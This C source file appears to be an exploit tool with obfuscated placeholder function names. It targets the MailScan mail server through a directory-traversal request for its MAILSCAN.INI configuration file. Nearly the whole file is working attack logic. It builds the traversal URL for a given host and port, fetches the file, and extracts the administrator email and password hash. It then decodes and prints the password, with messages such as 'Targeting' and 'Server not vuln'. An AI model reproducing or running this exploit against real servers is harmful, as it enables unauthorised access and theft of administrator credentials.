#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  buffer3 ;
typedef  int /*<<< orphan*/  buffer2 ;
typedef  int /*<<< orphan*/  HINTERNET ;
typedef  int /*<<< orphan*/  DWORD ;

/* Variables and functions */
 int /*<<< orphan*/  FUNC0 (char*) ; 
 int Count ; 
 int INTERNET_FLAG_NO_CACHE_WRITE ; 
 int INTERNET_FLAG_RELOAD ; 
 int /*<<< orphan*/  INTERNET_OPEN_TYPE_DIRECT ; 
 int /*<<< orphan*/  FUNC1 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ *,int /*<<< orphan*/ ,int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC3 (int /*<<< orphan*/ ,char*,int /*<<< orphan*/ *,int /*<<< orphan*/ *,int,int /*<<< orphan*/ *) ; 
 scalar_t__ FUNC4 (int /*<<< orphan*/ ,char*,int,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC5 (char*) ; 
 int /*<<< orphan*/  FUNC6 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC7 (char*,int /*<<< orphan*/ ,int) ; 
 int /*<<< orphan*/  FUNC8 (char*,...) ; 
 int /*<<< orphan*/  FUNC9 (char*,char*,...) ; 
 int /*<<< orphan*/  FUNC10 (char*,char*,char*) ; 
 int FUNC11 (char*) ; 
 char* FUNC12 (char*,char*) ; 

int FUNC13(char *url,char *port)
{
 FUNC8("[!] Targeting %s:%s\n",url,port);


 HINTERNET httpopen, openurl;
 char buffer2[1024];
 DWORD read;
 char *check;
 char *string1 = "http://";
 char *string2 = "/../../../../PROGRA~1/MailScan/MAILSCAN.INI";
 char bigbuffer[1025];
 char buffer3[1025];
 char buffer4[1025];
 char buffer5[1025];
 char buffer6[1025];



 if((httpopen = FUNC2(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0)))
 {
  FUNC8("[!] Building request!\n");
  FUNC7(bigbuffer,0,1025);
  FUNC6(bigbuffer,string1,FUNC11(string1));
  FUNC6(bigbuffer+FUNC11(bigbuffer),url,FUNC11(url));
  FUNC6(bigbuffer+FUNC11(bigbuffer),":",FUNC11(":"));
  FUNC6(bigbuffer+FUNC11(bigbuffer),port,FUNC11(port));
  FUNC6(bigbuffer+FUNC11(bigbuffer),string2,FUNC11(string2));
 }
 else
 {
  FUNC8("[-] Error building request!\n");
  FUNC1(httpopen);
  FUNC0(buffer2);
  return 0;
 }

 FUNC8("[!] Trying to connect @ %s:%s\n",url,port);
 if((openurl = FUNC3(httpopen, bigbuffer, NULL, NULL,
INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, NULL)))
 {
  FUNC8("[!] Connected to host!\n");
 }
 else
 {
  FUNC8("[-] Error while connecting! \n");
  FUNC1(httpopen);
  FUNC1(openurl);
  FUNC0(buffer2);
  return 0;
 }

 if(FUNC4(openurl, buffer2, sizeof(buffer2), &read))
 {

  if((check = FUNC12(buffer2, "[General]")))
  {

   check = FUNC12(buffer2, "UserPassword=");
   FUNC10(check, "UserPassword=%s ", buffer3);

   check = FUNC12(buffer2, "AdminEmailId=");
   FUNC10(check, "AdminEmailId=%s ", buffer4);

   check = FUNC12(buffer2, "ProductName=");
   FUNC10(check, "ProductName=%s ", buffer5);

   check = FUNC12(buffer2, "Version=");
   FUNC10(check, "Version=%s ", buffer6);
  }




 if( check==NULL )
 {
  FUNC8("[-] Server not vuln :(\n");

 }
 else
 {
  FUNC8("[+] SERVER: %s %s\n",buffer5,buffer6);
  FUNC8("[+] ADMIN: %s\n",buffer4);
  FUNC8("[+] HASH: %s\n",buffer3);
  FUNC8("[+] PASS: ");

  char bufferfiller[sizeof(buffer3)];
  char temp[1025];

  FUNC7(bufferfiller,0,sizeof(buffer3));

  for (int i=0;i < FUNC11(buffer3); i++)
  {
   Count++;

   FUNC9(temp,"%c",buffer3[i]);
   FUNC6(bufferfiller+FUNC11(bufferfiller),temp,FUNC11(temp));

   if(Count == 2)
   {
    char buf[255];
    FUNC7(buf,0,sizeof(255));
    FUNC9(buf,"%s",bufferfiller);

    FUNC5(buf);
    FUNC7(bufferfiller,0,1025);
    Count = 0;
   }
  }
  FUNC8("\n[+] Done!\n");
 }
 }
 else
 {
  FUNC8("[-] Server not vuln :(\n");
 }

 FUNC1(httpopen);
 FUNC1(openurl);
 FUNC0(buffer2);

 return 0;
}